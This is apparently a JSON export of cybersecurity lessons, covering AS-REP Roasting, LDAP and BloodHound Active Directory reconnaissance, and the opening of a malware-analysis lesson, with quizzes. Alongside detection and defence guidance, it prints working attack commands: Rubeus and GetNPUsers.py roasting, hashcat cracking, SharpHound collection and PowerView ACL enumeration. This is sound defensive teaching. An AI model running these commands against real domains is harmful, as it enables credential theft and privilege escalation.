      "content": "**AS-REP Roasting** (MITRE **T1558.004**, Steal or Forge Kerberos Tickets: AS-REP Roasting) is the formal name for the attack the primer above just walked through: hunting for accounts with Kerberos pre-authentication disabled, requesting their AS-REP without proving any password, and cracking the encrypted portion of that reply offline.\n\n### Why would any account have preauth disabled?\n\nNobody sets this flag maliciously on purpose in most environments; it becomes a vulnerability through misconfiguration or legacy interoperability:\n\n- **Legacy application compatibility.** Some older Kerberos client implementations, certain Unix/Linux stacks or older third-party software, could not perform preauth correctly, so admins disabled it on the accounts those systems used to make login work.\n- **Copy-paste account provisioning.** An admin clones settings from an old service account template that had the flag set, without realising what it does.\n- **Deliberate but forgotten testing.** A flag toggled for troubleshooting once, never reverted.\n\nWhatever the cause, the flag is silent and low-visibility; nothing about the account looks obviously broken in a normal admin view, which is exactly why attackers hunt for it specifically rather than assuming it exists.\n\n### Why no lockout protects the account\n\nThis is worth repeating because it is the single most important operational fact about this attack: the account lockout policy never engages, because the attacker never sends a wrong password to the domain. They only request the AS-REP, which the KDC hands over unconditionally for these accounts, and then guess passwords against a copy of the ciphertext, entirely on their own hardware. A domain admin watching failed-logon counters or Event ID 4625 (failed logon) sees nothing at all, no matter how many billions of guesses the attacker's GPU churns through.\n\n### The only real protection is password strength\n\nBecause there is no rate limit, the account's fate rests entirely on whether its password is strong enough to survive offline cracking, or on removing the preauth exemption so the whisper-check protection returns. A weak password on a preauth-disabled account, especially a privileged one, is one of the cheapest full compromises available to an attacker who has any way to enumerate accounts at all, even completely anonymously in some AD configurations."
    },
    {
      "heading": "How the Attack Works Step by Step",
      "content": "The attacker does not need valid domain credentials to find and roast preauth-disabled accounts in many configurations, though having any authenticated, or even just network, access makes enumeration far easier and more reliable.\n\n### Step 1: Discover targets\n\nThe attacker needs a list of accounts with the DONT_REQ_PREAUTH bit set. An LDAP filter using a bitwise matching-rule OID finds them directly: `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`, where `4194304` is decimal for the 0x400000 flag. This can be run with `ldapsearch`, PowerShell's `Get-ADUser -LDAPFilter`, or automated by offensive tools:\n\n```\nRubeus.exe asreproast /format:hashcat /outfile:hashes.txt\n```\n\nRubeus queries LDAP itself, finds every preauth-disabled account it can see, requests an AS-REP for each, and writes out ready-to-crack hash strings.\n\n### Step 2 and 3: Request the AS-REP and extract the crackable blob\n\nImpacket's **GetNPUsers.py** does the same job from Linux, and is commonly used when a target username list is already known from LDAP enumeration or a leaked directory dump:\n\n```\nGetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass\n```\n\n`-no-pass` tells the tool it has no valid credentials at all; it is purely trying each username in `users.txt` to see if that account happens to have preauth disabled. For each one that does, it receives the AS-REP and writes a line like:\n\n```\n$krb5asrep$23$svc-legacy@CORP.LOCAL:8f3ac2b1e9d04a7c0192bd4e5f7a11c9\n```\n\nReading this hash string: `krb5asrep` marks it as an AS-REP Roasting hash; the **23** is the encryption type, RC4-HMAC (etype 0x17), the weakest and fastest-to-crack Kerberos encryption type, and the one older tooling deliberately requests because it accelerates cracking; the rest is the account name, realm, and the ciphertext itself.\n\n### Step 4: Crack offline\n\n```\nhashcat -m 18200 asrep_hashes.txt rockyou.txt -r best64.rule\n```\n\n`-m 18200` selects Hashcat's AS-REP Roasting mode; the wordlist and rule file supply candidate passwords and common mutations. Cracking speed depends only on the attacker's hardware; modern GPUs try many millions of candidates per second against RC4-encrypted material.\n\n### Step 5: Use the recovered password\n\nA cracked password is used exactly like any stolen credential: interactive logon, remote access, or as a stepping stone toward higher privilege. The highest-impact version of this attack is finding a privileged account, a Domain Admin or a service account with broad rights, that someone carelessly exempted from preauth. A single weak password there converts silent offline cracking directly into domain-wide compromise."
    },
    {
      "heading": "AS-REP Roasting vs Kerberoasting",
      "content": "Both attacks recover a password by cracking Kerberos-derived ciphertext offline, but they target different accounts, different tickets, and different prerequisites. Confusing them leads to wrong detection logic, so know the distinction cold.\n\n| Aspect | AS-REP Roasting (T1558.004) | Kerberoasting (T1558.003) |\n|---|---|---|\n| Targeted accounts | Users with preauth disabled (DONT_REQ_PREAUTH) | Accounts with a Service Principal Name (SPN) |\n| Kerberos message | AS-REP, the initial auth exchange | TGS-REP, a service ticket |\n| Encrypted with | Target user's password-derived key | Target service account's password-derived key |\n| Needs valid domain creds? | No, can be fully unauthenticated | Yes, must be able to request a TGS |\n| Key event ID | 4768, AS ticket requested | 4769, service ticket requested |\n| Hashcat mode | 18200 | 13100 |\n\nThe pivotal difference for a SOC: Kerberoasting requires an authenticated attacker who can request service tickets, so it shows up in 4769 logs. AS-REP Roasting can be fully unauthenticated and surfaces in 4768 logs. Both share the same underlying weakness, RC4 encryption combined with weak passwords, and both are defeated by strong passwords and, where applicable, gMSA service accounts. But only AS-REP Roasting is fixed by simply re-enabling pre-authentication, since Kerberoasting cannot be stopped by removing SPNs that services legitimately need to function."
    },
    {
      "heading": "Detection: Spotting It in Event ID 4768",
      "content": "**Detection** centres on **Event ID 4768** (A Kerberos authentication ticket (TGT) was requested) on Domain Controllers, the DC-side record of every AS-REQ/AS-REP exchange, whether preauth happened or not. AS-REP Roasting leaves distinctive fingerprints inside that single event:\n\n```\nEventID: 4768\nAccount Name: svc-legacy\nAccount Domain: CORP\nPre-Authentication Type: 0\nTicket Encryption Type: 0x17\nClient Address: 10.14.22.108\n```\n\nTwo fields matter most:\n\n- **Pre-Authentication Type = 0.** This is the direct, unambiguous signal: a value of 0 means no pre-authentication was performed at all for this request. A normal interactive logon shows a non-zero preauth type, commonly 2, encrypted timestamp preauth succeeding. Type 0 on its own, for an account that should be a normal user, is the single strongest indicator this technique produces.\n- **Ticket Encryption Type = 0x17 (RC4-HMAC).** In any environment that has standardised on AES (0x12 for AES256-CTS-HMAC-SHA1, 0x11 for AES128), seeing RC4 in a 4768 is itself worth flagging, because forging and roasting tooling still defaults to requesting RC4 for cracking speed.\n\nBeyond single events, watch the pattern: a burst of 4768 requests for many different usernames, from one source IP, in a short window, is bulk roasting rather than a person logging in; nobody logs in as fifty different accounts from one workstation in ten seconds.\n\nA practical SIEM correlation rule: `EventID=4768 AND PreAuthType=0`, enriched with the encryption type and grouped by source IP over a short window. Baseline which accounts in your environment legitimately have preauth disabled, since there are sometimes a handful for real interoperability reasons, so that requests for accounts outside that known-exempt list stand out immediately as unexpected exposure or active exploitation.\n\nA **honeytoken** account, deliberately created with preauth disabled, given a tempting name like `svc_backup_admin`, and assigned a long random password nobody will ever guess, is one of the highest-fidelity tripwires available: it has no legitimate reason to ever be queried, so any 4768 with `PreAuthType=0` against it is a real detection, not a probabilistic score."
    },
    {
      "heading": "Defence: Closing the Gap",
      "content": "Defence attacks the root cause of the exposure rather than only reacting to the cracking activity.\n\n### Require Kerberos pre-authentication\n\nAudit `userAccountControl` for the DONT_REQ_PREAUTH (0x400000) flag domain-wide and remove it wherever legacy needs do not truly require it. This alone neutralises the attack, since the KDC returns to demanding the whisper-check proof before ever handing out an AS-REP.\n\n### Enforce strong, long passwords\n\nOffline cracking is bounded only by password strength, so any account that must remain preauth-exempt for legitimate reasons needs a password long and random enough to resist GPU cracking, ideally 25 or more characters. Prefer **gMSA (Group Managed Service Accounts)** where possible, so passwords are machine-generated, long, and auto-rotated, removing the human weak-password risk entirely.\n\n### Disable RC4 and standardise on AES\n\nRemoving RC4-HMAC support forces Kerberos exchanges onto AES, eliminating the weak, fast-to-crack encryption type that roasting tooling relies on by default, and turning any RC4 usage that does appear into an anomaly worth investigating on its own.\n\n### Continuously audit the flag\n\nA fixed setting can silently regress: a migration project, an application onboarding, or a careless template copy can re-introduce DONT_REQ_PREAUTH on an account that was previously clean. Schedule recurring audits (or a SIEM-fed scheduled query) that alert on any newly added preauth exemption, and pair it with the honeytoken account from the detection section so that even a missed audit window still has a tripwire in place."
    }
  ],
  "keyTakeaways": [
    "Kerberos login normally requires pre-authentication: proving you know your password by encrypting a timestamp with a password-derived key before the KDC will issue a TGT, like a bouncer's whisper-check password.",
    "The DONT_REQ_PREAUTH flag (userAccountControl bit 0x400000) tells the KDC to skip that whisper-check, so it hands out an AS-REP to anyone who asks for that username, with the session-key portion still encrypted using the account's password-derived key.",
    "Because cracking happens entirely offline against the captured ciphertext with tools like Rubeus, GetNPUsers.py, and Hashcat mode 18200, there is no lockout, no rate limit, and no failed-logon event, unlike a normal wrong-password attempt.",
    "AS-REP Roasting (T1558.004, unauthenticated, targets preauth-disabled users, appears in 4768) is easy to confuse with Kerberoasting (T1558.003, requires authentication, targets SPN accounts, appears in 4769); only AS-REP Roasting is fixed by simply re-enabling preauth.",
    "Detect it on Event ID 4768 where Pre-Authentication Type = 0 and encryption type is RC4 (0x17); defend by re-enabling preauth, enforcing long passwords or gMSA, disabling RC4, and planting a preauth-disabled honeytoken account as a tripwire."
  ],
  "quiz": [
    {
      "question": "An analyst wants a high-fidelity SIEM rule for AS-REP Roasting. Which Event ID 4768 condition most reliably indicates the attack rather than normal authentication?",
      "options": [
        {
          "label": "A logon occurring outside business hours from a service account that normally authenticates during scheduled batch windows.",
          "value": "a"
        },
        {
          "label": "A Pre-Authentication Type value of 0 combined with RC4-HMAC (0x17) encryption for the requested ticket.",
          "value": "b"
        },
        {
          "label": "A successful ticket request immediately followed by several LDAP queries enumerating the user's group memberships.",
          "value": "c"
        },
        {
          "label": "Multiple failed logon attempts against the same account triggering the domain account lockout threshold policy.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: Pre-Auth Type 0 means no pre-authentication was performed, the defining trait of AS-REP Roasting, and RC4 encryption reflects the attacker choosing the weakest crackable etype. (a) Off-hours logons are a weak, generic anomaly, not specific to roasting. (c) LDAP enumeration is separate recon activity, not the AS-REP signature. (d) AS-REP Roasting causes no failed logons or lockouts because cracking is entirely offline, so lockouts actually point elsewhere."
    },
    {
      "question": "A junior analyst says AS-REP Roasting and Kerberoasting are 'basically identical.' Which statement correctly distinguishes them for detection purposes?",
      "options": [
        {
          "label": "AS-REP Roasting requires valid domain credentials to request tickets, whereas Kerberoasting can always be executed by a fully unauthenticated attacker.",
          "value": "a"
        },
        {
          "label": "AS-REP Roasting targets preauth-disabled users via 4768, while Kerberoasting targets SPN accounts via 4769 and needs an authenticated context.",
          "value": "b"
        },
        {
          "label": "Both attacks are prevented entirely by removing Service Principal Names, since neither can function without an SPN attached to the account.",
          "value": "c"
        },
        {
          "label": "Kerberoasting cracks the AS-REP encrypted blob while AS-REP Roasting cracks the TGS-REP service ticket returned by the domain controller.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: AS-REP Roasting exploits preauth-disabled users and appears in 4768, whereas Kerberoasting exploits SPN accounts, requires authentication to request a TGS, and appears in 4769. (a) Reverses the prerequisites: AS-REP Roasting can be unauthenticated, Kerberoasting cannot. (c) Removing SPNs cannot fix Kerberoasting for services that legitimately need them, and does nothing for AS-REP Roasting. (d) Swaps the tickets: AS-REP Roasting cracks the AS-REP, Kerberoasting cracks the TGS-REP."
    },
    {
      "question": "Why does AS-REP Roasting never trigger the domain's account lockout policy, even after millions of password guesses against the captured ciphertext?",
      "options": [
        {
          "label": "Because the attacker cracks the AS-REP ciphertext offline on their own hardware, so no guesses are ever sent to the domain controller.",
          "value": "a"
        },
        {
          "label": "Because accounts with preauthentication disabled are automatically excluded from every account lockout policy configured in the domain.",
          "value": "b"
        },
        {
          "label": "Because Kerberos encrypts all guessed passwords before transmission, so the domain controller cannot detect repeated attempts.",
          "value": "c"
        },
        {
          "label": "Because the attacker resets the account lockout counter using the same replication rights that DCSync abuses against krbtgt.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct: after the single AS-REP capture, all subsequent password guessing happens entirely offline against a local copy of the ciphertext, so the domain controller never sees another authentication attempt and its lockout counter never moves. (b) Lockout policy is not tied to the preauth flag; it simply never gets triggered here. (c) Guesses are not transmitted at all during cracking, so 'encrypted transmission' misdescribes the mechanism. (d) Replication rights are unrelated to lockout counters and play no role in this attack."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1558/004/",
    "https://attack.mitre.org/techniques/T1558/003/",
    "https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768",
    "https://learn.microsoft.com/en-us/defender-for-identity/credential-access-alerts"
  ],
  "xp": 260,
  "estimatedMinutes": 55,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-ldap-bloodhound-ad-recon",
  "slug": "ldap-bloodhound-ad-recon",
  "title": "LDAP and BloodHound: Mapping the Attack Paths in Active Directory",
  "topic": "Active Directory Attacks",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Before any Kerberoast, DCSync, or lateral move, an attacker asks a simpler question: who has power over what? Active Directory answers that question freely over LDAP, and BloodHound turns the answers into a graph of attack paths. This lesson assumes no prior AD knowledge and starts from zero: what a domain and a directory service actually are, what LDAP is, and what a SID and an ACL mean, before walking through real enumeration commands (ldapsearch, PowerView), how SharpHound collects data for BloodHound, a fully worked attack-path example, and the exact Windows events and behavioural tells a SOC uses to catch the enumeration.",
  "sections": [
    {
      "heading": "Start Here: What AD, a Domain, and LDAP Actually Are",
      "content": "Every attack in this Active Directory series, DCSync, Golden and Silver Tickets, AS-REP Roasting, depends on the attacker first knowing who exists and who has power over whom. This lesson is about that knowledge-gathering step, so before anything else, four basics need to be solid.\n\n### What is a domain, and what is a directory service?\n\nA Windows **domain** is a group of computers and user accounts centrally managed together: one set of logins, one set of policies, administered as a unit rather than machine by machine. The database that holds all of this, every user, every computer, every group, and the relationships between them, is Active Directory's **directory service**: think of it as a company's master phone book and org chart combined into one queryable database, except the phone book also records who has keys to which doors and who is allowed to reset whose password.\n\n### What is a Domain Controller?\n\nA **Domain Controller (DC)** is a server that holds a copy of this directory database and answers questions about it: is this the right password for this user, what groups does this user belong to, what computers exist in this domain. Every domain has at least one, usually several for redundancy, kept in sync via replication, covered in the companion DCSync lesson.\n\n### What is LDAP?\n\n**LDAP (Lightweight Directory Access Protocol)** is simply the language used to ask a directory service questions and get answers, over the network, on TCP port **389** normally, or **636** for the encrypted version, LDAPS. When any program, a login screen, an email client checking your name, an admin tool listing users, needs directory information, it is very likely speaking LDAP to a DC behind the scenes, whether or not you ever see it. Crucially, by design, most of what is in the directory is readable by any authenticated domain user; the same openness that lets a helpdesk application look up your manager's name also lets an attacker look up who is a Domain Admin.\n\n### What is a SID, and what is an ACL?\n\nEvery account and group in AD gets a unique identifier called a **SID (Security Identifier)**, a long string like `S-1-5-21-...-512`, where the trailing number, the **RID**, identifies well-known accounts (500 is the built-in Administrator, 512 is Domain Admins). Separately, almost every object in AD, a user, a group, even the domain itself, carries an **ACL (Access Control List)**: a list of who is allowed to do what to that specific object, such as read it, modify it, reset its password, or add members to it. ACLs are how AD expresses fine-grained delegated permissions, and, as this lesson shows, they are also where a huge amount of unintended privilege hides, because a permission granted once, for one legitimate reason, rarely gets revisited or removed.\n\nWith domain, DC, LDAP, SID, and ACL defined, we can look at why an attacker reads all of this before ever touching a password."
    },
    {
      "heading": "Why Recon Comes First",
      "content": "Reconnaissance precedes every serious AD attack because attacks are relationship-driven. Kerberoasting needs to know which accounts have SPNs. AS-REP Roasting needs to know which accounts lack preauth. DCSync needs to know who holds replication rights. Privilege escalation needs to know which low-privilege account can reset a high-privilege account's password. All of this is discoverable by reading AD, not attacking it.\n\nRelevant MITRE techniques map cleanly to enumeration goals:\n\n- **T1087** Account Discovery: enumerate users.\n- **T1069** Permission Groups Discovery: enumerate groups and memberships.\n- **T1482** Domain Trust Discovery: enumerate trusts between domains and forests.\n- **T1018** Remote System Discovery and related techniques for hosts and sessions.\n\nAn attacker's mental model is a graph: nodes are principals, users, groups, computers, and edges are rights, such as MemberOf, AdminTo, CanRDP, GenericAll, WriteDACL, and ForceChangePassword. The attacker's job is to find a path from their current low-privilege node to a high-value node like Domain Admins. Recon builds that graph, and the graph, not brute force, is what makes modern AD compromise fast and reliable. Understanding recon is therefore the foundation for detecting the entire kill chain early, while the attacker is still just looking."
    },
    {
      "heading": "Enumerating AD Over LDAP",
      "content": "Attackers query LDAP directly using built-in and offensive tooling: `ldapsearch`, PowerShell's `Get-ADUser`, **PowerView**, **AD Explorer**, and Impacket scripts. Because reads are broadly permitted, most of this looks like ordinary directory traffic. Key enumeration targets:\n\n- **Users (T1087).** Pull `sAMAccountName`, `description` (admins sometimes store passwords here), `userAccountControl` (revealing disabled accounts and the DONT_REQ_PREAUTH flag), and `lastLogonTimestamp` to find stale accounts.\n- **Groups and membership (T1069).** Map who belongs to Domain Admins, Enterprise Admins, Account Operators, and other privileged groups, following nested memberships.\n- **SPNs.** Query `servicePrincipalName` to build a Kerberoasting target list in one filter.\n- **Trusts (T1482).** Enumerate `trustedDomain` objects to find paths into other domains or forests, and whether trusts are transitive.\n- **ACLs.** Read the security descriptor (`nTSecurityDescriptor`) on objects to find dangerous rights like GenericAll, WriteDACL, WriteOwner, and ForceChangePassword that enable privilege escalation without any exploit.\n\nA representative unauthenticated-format LDAP query for SPN accounts:\n\n```\nldapsearch -x -H ldap://dc01.corp.local -D svc-helpdesk02@corp.local -w P@ssw0rd2024 -b DC=corp,DC=local (servicePrincipalName=*) sAMAccountName servicePrincipalName\n```\n\nThis single command returns every account carrying a Service Principal Name, a ready-made Kerberoasting target list, using nothing but an ordinary authenticated bind. PowerView, a PowerShell offensive toolkit, wraps similar queries in friendlier syntax:\n\n```\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname\nGet-DomainGroupMember -Identity 'Domain Admins' -Recurse\nGet-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs\n```\n\nThe first line finds AS-REP Roasting targets; the second walks Domain Admins membership, following nested groups; the third dumps the ACL on the Domain Admins group itself, resolving the raw permission GUIDs into readable rights.\n\nA representative LDAP filter for preauth-disabled accounts is `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`; this bitwise matching-rule OID lets an attacker slice `userAccountControl` flags precisely without pulling and parsing every account by hand.\n\nThe strategic insight is that ACLs are the hidden attack surface. Group membership is obvious, but delegated rights, someone who can reset a service account's password, or write to a group's membership, are where real, non-obvious escalation paths hide. Reading them requires no special privilege, only knowing to look, which is exactly what BloodHound automates."
    },
    {
      "heading": "BloodHound and SharpHound: The Attack-Path Graph",
      "content": "**BloodHound** is an open-source tool that ingests AD data and renders it as an interactive graph database (Neo4j), letting an attacker or defender run queries like 'shortest path from this user to Domain Admins.' Its data collector is **SharpHound**, a C# collector, run as `SharpHound.exe` or via the PowerShell/BloodHound-python variants.\n\n### Running a collection\n\n```\nSharpHound.exe -c All,GPOLocalGroup -d corp.local --zipfilename recon.zip\n```\n\nThe `-c` flag names the **collection methods**. `Default` (or `DCOnly`) collects mainly from the DC over LDAP and is quiet, touching only directory data. `All` additionally connects out to individual workstations and servers to gather logon sessions and local admin group membership, which is far noisier on the network. `GPOLocalGroup` reads Group Policy-assigned local admin rights. Understanding which method was used helps a SOC gauge how aggressively an environment was swept.\n\n### What SharpHound collects\n\n- **Domain objects**: users, groups, computers, OUs, GPOs, trusts.\n- **Group memberships**, including nested chains.\n- **ACLs and object rights**: GenericAll, WriteDACL, WriteOwner, AddMember, ForceChangePassword, and more, the edges that enable non-exploit escalation.\n- **Sessions**, via collection methods like Session/LoggedOn: which users are logged on to which machines right now, revealing where privileged credentials are exposed for theft.\n- **Local admin rights (AdminTo)**, RDP and DCOM access, and constrained/unconstrained delegation settings.\n\n### Querying the graph\n\nBloodHound models everything as nodes and edges, and its power is transitive pathfinding. A built-in query like 'Find Shortest Paths to Domain Admins' runs, under the hood, a Cypher graph query similar to:\n\n```\nMATCH p=shortestPath((n:User {name:'SVC-HELPDESK02@CORP.LOCAL'})-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))\nRETURN p\n```\n\nThis asks the graph database for the shortest chain of edges, of any type, that connects one starting account to the Domain Admins group. Even if no single step is alarming on its own, chaining edges such as `ForceChangePassword -> MemberOf -> AdminTo` can walk an attacker from a helpdesk account to a Domain Controller in seconds, turning hours of manual ACL analysis into one query. Defenders should run BloodHound themselves, proactively, to find and cut the same paths attackers would exploit."
    },
    {
      "heading": "Worked Example: Tracing a Path to Domain Admins",
      "content": "Consider a graph BloodHound might show after ingesting a SharpHound collection, reduced to its shortest path:\n\n```\n(User: svc-helpdesk02) -[ForceChangePassword]-> (User: it-support-lead) -[MemberOf]-> (Group: IT-ADMINS) -[AdminTo]-> (Computer: DC01)\n```\n\nReading each edge as a plain-English right:\n\n- **ForceChangePassword**: `svc-helpdesk02` was, at some point, delegated the right to reset `it-support-lead`'s password without knowing the current one, a legitimate helpdesk convenience, turned into step one of an attack path.\n- **MemberOf**: `it-support-lead` belongs to the `IT-ADMINS` group.\n- **AdminTo**: `IT-ADMINS` has local administrator rights on `DC01`, a Domain Controller.\n\nNo step in this chain is, by itself, alarming: helpdesk accounts routinely reset passwords, group memberships are normal, and admin groups routinely administer servers. It is the chain, four ordinary facts strung together, that produces a devastating outcome: an attacker holding `svc-helpdesk02` can reset `it-support-lead`'s password, log in as them, and land with local admin on a Domain Controller, a direct route to dumping LSASS secrets or running DCSync (see the companion DCSync lesson) as a fully privileged identity.\n\nThis is exactly the kind of path BloodHound's pre-built 'Shortest Paths to Domain Admins' query surfaces automatically, and it is why defenders are urged to run BloodHound against their own environment: any path an attacker's graph could find, a defender's graph finds first, and can usually be cut by simply removing one unnecessary edge, here `svc-helpdesk02`'s ForceChangePassword right, before it is ever exploited."
    },
    {
      "heading": "Detection: Volume, Breadth, and Rights-Focused Reads",
      "content": "Detection of AD recon is challenging because reading the directory is normal. Focus on volume, breadth, and rights-focused reads rather than any single query.\n\n- **Event ID 4662** (An operation was performed on an object). Aggressive SharpHound ACL collection generates large numbers of 4662 reads across many objects from one principal in a short window. A representative sequence looks like:\n\n```\nEventID: 4662\nSubjectUserName: svc-helpdesk02\nObjectType: group\nObjectName: CN=Domain Admins,CN=Users,DC=corp,DC=local\nAccessMask: 0x20000\n... (repeated for thousands of distinct ObjectName values within minutes)\n```\n\nA single account touching thousands of objects, especially reading security descriptors, is a strong enumeration signal. Note that 4662 requires SACL auditing to be configured on the objects to fire at all.\n\n- **Event ID 4661** (A handle to an object was requested) can similarly spike during bulk enumeration.\n- **LDAP query telemetry.** Domain Controllers can log expensive or inefficient LDAP searches; broad filters like `(objectClass=*)` or bitwise `userAccountControl` scans from a workstation are suspicious. **Microsoft Defender for Identity** flags LDAP reconnaissance and SharpHound-style enumeration patterns directly.\n- **SharpHound behavioural tells**: a burst of connections from one host to many machines, typical of Session/LoggedOn collection, and rapid sequential LDAP binds enumerating users, groups, and ACLs together in a short window.\n\n**Honeytoken accounts** are the highest-value tripwire: a decoy user or computer with an enticing name, such as `svc_backup_admin`, and no legitimate use. Any LDAP read, Kerberos request, or BloodHound edge touching it is almost certainly malicious, and it appears prominently in SharpHound output, catching the collection itself rather than only its later exploitation."
    },
    {
      "heading": "Defence: Reducing Exposure and Payoff",
      "content": "Defence reduces both exposure, what an attacker can find, and payoff, what a found path is worth.\n\n### Least privilege and ACL hygiene\n\nRemove dangerous delegated rights, such as GenericAll and WriteDACL, that create escalation edges; audit ACLs regularly, ideally by running BloodHound defensively against your own domain on a recurring schedule, the same way an attacker would, and remediating the shortest paths it surfaces before they are found by someone else.\n\n### Administrative tiering\n\nApply the tiered model described in the companion DCSync lesson, so that enumerating a workstation never reveals Tier 0 sessions to steal, and so an ACL misconfiguration on a lower tier cannot chain upward into Domain Admin control.\n\n### Reduce readable attack surface\n\nClear secrets from `description` fields, retire stale accounts flagged by old `lastLogonTimestamp` values, and constrain sensitive attribute visibility where possible, shrinking what any authenticated read can reveal.\n\n### Deploy behavioural monitoring\n\nDeploy Microsoft Defender for Identity on Domain Controllers for behavioural recon detection, and baseline normal LDAP query volume per account so that bulk enumeration, whether from SharpHound or manual PowerView usage, stands out clearly against everyday application traffic rather than blending into it."
    }
  ],
  "keyTakeaways": [
    "AD is a directory service, a queryable database of users, groups, and computers, exposed over LDAP; by design most of it is readable by any authenticated domain user, which is a feature for applications and a gift for attackers.",
    "AD recon precedes every attack because compromise is relationship-driven: attackers enumerate users (T1087), groups (T1069), trusts (T1482), SPNs, and especially ACLs, since delegated rights like GenericAll and ForceChangePassword create escalation edges that group membership alone never reveals.",
    "BloodHound and its collector SharpHound turn AD and ACL data into a graph database, using transitive pathfinding to chain ordinary-looking rights (ForceChangePassword, MemberOf, AdminTo) into a full path from a low-privilege account to Domain Admins.",
    "A real worked path shows why no single edge looks alarming: it is the chain across four ordinary facts that produces a devastating outcome, which is exactly why defenders must run BloodHound against their own environment and cut edges, not just monitor individually.",
    "Detect enumeration by volume and breadth, not single queries: watch for bursts of Event ID 4662 security-descriptor reads, LDAP recon flagged by Defender for Identity, and honeytoken accounts being touched; defend with least-privilege ACL hygiene, tiering, and proactive BloodHound sweeps."
  ],
  "quiz": [
    {
      "question": "A SOC notices one standard user account generating thousands of Event ID 4662 object-read operations across users, groups, and computer objects within a few minutes. What is the most likely explanation?",
      "options": [
        {
          "label": "A scheduled backup service reading its own configuration objects during a nightly maintenance job on the domain controller.",
          "value": "a"
        },
        {
          "label": "SharpHound performing bulk AD enumeration, collecting object ACLs and memberships to build a BloodHound attack-path graph.",
          "value": "b"
        },
        {
          "label": "A single interactive user logon that reads only that user's own group memberships as part of applying group policy.",
          "value": "c"
        },
        {
          "label": "Normal replication between two domain controllers synchronizing directory changes across the site link on schedule.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: a burst of thousands of 4662 reads spanning many object types and touching security descriptors is the hallmark of SharpHound ACL/membership collection for BloodHound. (a) A backup service reads a narrow, predictable set of objects, not the whole directory. (c) A normal logon reads only the user's own memberships, nowhere near thousands of objects. (d) Replication is DC-to-DC and would not originate from a standard user account."
    },
    {
      "question": "Why do defenders consider Active Directory ACLs, not just group memberships, a critical part of the BloodHound attack surface?",
      "options": [
        {
          "label": "ACLs are encrypted with the krbtgt key, so reading them requires domain admin rights that most attackers cannot obtain.",
          "value": "a"
        },
        {
          "label": "ACLs can grant rights like GenericAll or ForceChangePassword that create non-obvious escalation edges chainable into a path.",
          "value": "b"
        },
        {
          "label": "ACLs are stored only on domain controllers and never replicate, so they remain completely invisible to LDAP enumeration tools.",
          "value": "c"
        },
        {
          "label": "ACLs primarily control file share permissions and therefore have no bearing on Kerberos or directory privilege escalation.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: delegated rights such as GenericAll, WriteDACL, and ForceChangePassword form graph edges that let an attacker escalate without any exploit, and BloodHound's transitive pathfinding chains them toward Domain Admins. (a) ACLs are readable by any authenticated user and are not krbtgt-encrypted. (c) Object security descriptors replicate and are readable over LDAP, which is how SharpHound collects them. (d) These are directory-object ACLs governing AD rights, not merely file share permissions."
    },
    {
      "question": "Why does a defender running BloodHound against their own domain provide real security value, rather than just mapping what an attacker could already find?",
      "options": [
        {
          "label": "Because BloodHound automatically deletes any dangerous ACL edge it discovers, remediating the domain without further administrator action.",
          "value": "a"
        },
        {
          "label": "Because it surfaces the same chained ACL and membership paths an attacker would find, so defenders can remove them first.",
          "value": "b"
        },
        {
          "label": "Because BloodHound only works when run by a Domain Admin, so simply running it proves no lower-privileged account can reach Domain Admins.",
          "value": "c"
        },
        {
          "label": "Because SharpHound collection permanently disables LDAP querying for every other account in the domain once it completes.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: BloodHound's value is surfacing the exact same non-obvious, chained escalation paths an attacker's graph would find, so defenders can remove the specific unnecessary edges before exploitation. (a) BloodHound only visualises paths; it does not automatically remediate anything. (c) BloodHound can be run by any account with ordinary LDAP read access, which is the whole point of the exposure it reveals. (d) SharpHound collection does not disable LDAP for other accounts; it simply performs normal, permitted reads."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1087/",
    "https://attack.mitre.org/techniques/T1069/002/",
    "https://attack.mitre.org/techniques/T1482/",
    "https://learn.microsoft.com/en-us/defender-for-identity/reconnaissance-discovery-alerts",
    "https://bloodhound.readthedocs.io/en/latest/index.html"
  ],
  "xp": 255,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-static-vs-dynamic-malware-analysis",
  "slug": "static-vs-dynamic-malware-analysis",
  "title": "Static vs Dynamic Malware Analysis and Sandboxing",
  "topic": "Malware Analysis",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When a suspicious file lands in your queue, you have two fundamental ways to examine it: look at it without running it (static) or run it in a controlled environment and watch what it does (dynamic). This lesson starts from zero — defining what a file, a process, and an address space actually are — before building up a practical SOC triage workflow that uses both static and dynamic techniques, a realistic view of what sandboxes can and cannot tell you, and a full worked example you can follow command by command.",
  "sections": [
    {
      "heading": "Start Here: What a File, a Process, and Static vs Dynamic Actually Mean",
      "content": "Before we can talk about analysing malware, three foundational ideas need to be solid, because the rest of this lesson leans on them constantly.\n\n### What is a file, and what is a PE file?\n\nA file on disk is just a sequence of bytes. An executable file — one that Windows can run — is usually a **PE file**, short for **Portable Executable**, the standard format Windows uses for .exe, .dll, and .sys files. Think of a PE file like a shipping container: it has a header describing what is inside (when it was built, what CPU it targets), and then labelled compartments called sections holding the actual code, the data, and a table of outside functions it plans to borrow. A malware sample sitting in your queue is, physically, one of these PE files on disk, doing nothing until something runs it.\n\n### What is a process, and what is a thread?\n\nWhen the file runs, the operating system creates a **process**: a running instance of the program, with its own private slice of memory called its **address space** — think of it as the process's own sealed apartment, which only it can normally read or write. Inside that apartment, the actual work happens on one or more **threads** — a thread is a single sequential stream of instructions being executed. A process is the apartment; a thread is a resident actually doing things inside 